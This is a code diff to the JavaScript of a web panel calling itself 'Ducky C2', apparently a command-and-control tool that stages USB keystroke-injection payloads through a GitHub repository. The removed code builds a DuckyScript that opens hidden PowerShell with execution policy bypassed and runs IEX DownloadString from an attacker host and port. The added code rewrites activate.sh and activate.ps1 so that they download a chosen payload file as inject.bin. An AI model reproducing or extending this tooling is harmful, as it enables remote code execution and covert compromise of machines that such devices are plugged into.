@@ -8,22 +8,16 @@ const elements = {
     token: document.getElementById('githubToken'),
     connectBtn: document.getElementById('connectBtn'),
     statusIndicator: document.getElementById('connectionStatus'),
+    activePayloadDisplay: document.getElementById('activePayloadsList'),
     fileList: document.getElementById('fileList'),
-    refreshBtn: document.getElementById('refreshFiles'),
-    tcpHost: document.getElementById('tcpHost'),
-    tcpPort: document.getElementById('tcpPort'),
-    generateTcpBtn: document.getElementById('generateTcpBtn'),
-    scriptOutput: document.getElementById('scriptOutput'),
-    copyBtn: document.getElementById('copyScriptBtn'),
-    tabBtns: document.querySelectorAll('.tab-btn'),
-    tabContents: document.querySelectorAll('.tab-content')
+    refreshBtn: document.getElementById('refreshFiles')
 };
 
 // State
 let state = {
     token: localStorage.getItem('ducky_token') || '',
     repo: localStorage.getItem('ducky_repo') || '',
-    targetFile: localStorage.getItem('ducky_target') || 'payload.txt'
+    activePayload: 'UNKNOWN'
 };
 
 // Initialization
@@ -31,10 +25,8 @@ function init() {
     if (state.token && state.repo) {
         elements.repoName.value = state.repo;
         elements.token.value = state.token;
-        // Don't auto-show, let them click connect to verify again or just show login
-        // Actually, let's try to auto-connect silently
-        testConnection(state.repo, state.token).then(success => {
-            if (success) showDashboard();
+        testConnection(state.repo, state.token).then(result => {
+            if (result.success) showDashboard();
         });
     }
     setupEventListeners();
@@ -70,30 +62,9 @@ function setupEventListeners() {
         }
     });
 
-    elements.refreshBtn.addEventListener('click', loadFiles);
-
-    elements.generateTcpBtn.addEventListener('click', () => {
-        const host = elements.tcpHost.value || '127.0.0.1';
-        const port = elements.tcpPort.value || '4444';
-        const script = generateReverseTcp(host, port);
-        elements.scriptOutput.value = script;
-    });
-
-    elements.copyBtn.addEventListener('click', () => {
-        elements.scriptOutput.select();
-        document.execCommand('copy');
-        const originalText = elements.copyBtn.innerText;
-        elements.copyBtn.innerText = 'COPIED!';
-        setTimeout(() => elements.copyBtn.innerText = originalText, 2000);
-    });
-
-    elements.tabBtns.forEach(btn => {
-        btn.addEventListener('click', () => {
-            elements.tabBtns.forEach(b => b.classList.remove('active'));
-            elements.tabContents.forEach(c => c.classList.add('hidden'));
-            btn.classList.add('active');
-            document.getElementById(btn.dataset.tab).classList.remove('hidden');
-        });
+    elements.refreshBtn.addEventListener('click', () => {
+        loadFiles();
+        checkActivePayload();
     });
 }
 
@@ -102,7 +73,7 @@ async function testConnection(repo, token) {
     try {
         const response = await fetch(`${API_BASE}/repos/${repo}`, {
             headers: {
-                'Authorization': `Bearer ${token}`, // Changed to Bearer for better PAT support
+                'Authorization': `Bearer ${token}`,
                 'Accept': 'application/vnd.github.v3+json'
             }
         });
@@ -140,7 +111,40 @@ async function loadFiles() {
     }
 }
 
-async function updateFile(path, content, message = 'Update payload via Ducky C2') {
+async function checkActivePayload() {
+    elements.activePayloadDisplay.innerHTML = '<span class="loading">SCANNING_ACTIVATION_SCRIPTS...</span>';
+
+    try {
+        // Read activate.sh to see what's active
+        const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/activate.sh`, {
+            headers: {
+                'Authorization': `Bearer ${state.token}`,
+                'Accept': 'application/vnd.github.v3+json'
+            }
+        });
+
+        if (response.ok) {
+            const data = await response.json();
+            const content = atob(data.content);
+
+            // Look for the filename in the URL
+            // Example: curl ... https://raw.../main/rickroll.bin ...
+            const match = content.match(/\/main\/([\w-]+\.bin)/);
+            if (match && match[1]) {
+                state.activePayload = match[1];
+                elements.activePayloadDisplay.innerHTML = `<span class="status-indicator connected">${state.activePayload}</span>`;
+                return;
+            }
+        }
+
+        elements.activePayloadDisplay.innerHTML = '<span class="status-indicator">NO_ACTIVE_PAYLOAD_DETECTED</span>';
+    } catch (e) {
+        console.error(e);
+        elements.activePayloadDisplay.innerHTML = '<span class="status-indicator error">SCAN_ERROR</span>';
+    }
+}
+
+async function updateFile(path, content, message) {
     try {
         let sha = '';
         try {
@@ -178,10 +182,9 @@ async function updateFile(path, content, message = 'Update payload via Ducky C2'
             throw new Error(err.message || response.statusText);
         }
 
-        alert(`SUCCESS: Wrote to ${path}`);
-        loadFiles();
+        return true;
     } catch (e) {
-        alert(`ERROR: ${e.message}`);
+        throw e;
     }
 }
 
@@ -192,6 +195,7 @@ function showDashboard() {
     elements.statusIndicator.innerText = 'CONNECTED';
     elements.statusIndicator.classList.add('connected');
     loadFiles();
+    checkActivePayload();
 }
 
 function renderFiles(files) {
@@ -199,12 +203,19 @@ function renderFiles(files) {
 
     if (!Array.isArray(files)) return;
 
-    files.filter(f => f.type === 'file').forEach(file => {
+    // Filter for likely payload files (.bin)
+    const relevantFiles = files.filter(f =>
+        f.type === 'file' &&
+        f.name.endsWith('.bin') &&
+        f.name !== 'inject.bin'
+    );
+
+    relevantFiles.forEach(file => {
         const card = document.createElement('div');
         card.className = 'file-card';
 
-        const isTarget = file.name === state.targetFile;
-        if (isTarget) card.classList.add('active');
+        const isActive = file.name === state.activePayload;
+        if (isActive) card.classList.add('active');
 
         card.innerHTML = `
             <div class="file-info">
@@ -212,7 +223,7 @@ function renderFiles(files) {
                 <div class="file-size">${(file.size / 1024).toFixed(2)} KB</div>
             </div>
             <div class="file-actions">
-                ${!isTarget ? `<button class="cyber-btn small" onclick="activatePayload('${file.name}')">ACTIVATE</button>` : '<span class="status-indicator connected">ACTIVE</span>'}
+                ${!isActive ? `<button class="cyber-btn small" onclick="activatePayload('${file.name}')">ACTIVATE</button>` : '<span class="status-indicator connected">ACTIVE</span>'}
             </div>
         `;
         elements.fileList.appendChild(card);
@@ -228,34 +239,25 @@ function saveCredentials(repo, token) {
 
 // Logic Functions
 window.activatePayload = async function (filename) {
-    if (!confirm(`Overwrite ${state.targetFile} with content of ${filename}?`)) return;
+    if (!confirm(`ACTIVATE ${filename}?\nThis will overwrite activate.sh and activate.ps1.`)) return;
+
+    const repo = state.repo;
+
+    // Templates
+    const shContent = `curl -L "https://raw.githubusercontent.com/${repo}/main/${filename}" -o inject.bin`;
+    const ps1Content = `Invoke-WebRequest -Uri "https://raw.githubusercontent.com/${repo}/main/${filename}" -OutFile "inject.bin"`;
 
     try {
-        const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/${filename}`, {
-            headers: {
-                'Authorization': `Bearer ${state.token}`,
-                'Accept': 'application/vnd.github.v3+json'
-            }
-        });
-        const data = await response.json();
-        const content = atob(data.content);
+        await updateFile('activate.sh', shContent, `Activate ${filename} (sh)`);
+        await updateFile('activate.ps1', ps1Content, `Activate ${filename} (ps1)`);
 
-        await updateFile(state.targetFile, content, `Activated ${filename}`);
+        alert(`SUCCESS: Activated ${filename}`);
+        checkActivePayload();
+        loadFiles();
     } catch (e) {
-        alert('Error activating payload: ' + e.message);
+        alert(`FAILED: ${e.message}`);
     }
 };
-
-function generateReverseTcp(host, port) {
-    return `
-REM Reverse TCP Payload generated by Ducky C2
-DELAY 1000
-GUI r
-DELAY 200
-STRING powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object Net.WebClient).DownloadString('http://${host}:${port}/payload.ps1')"
-ENTER
-    `.trim();
-}
 
 // Start
 init();
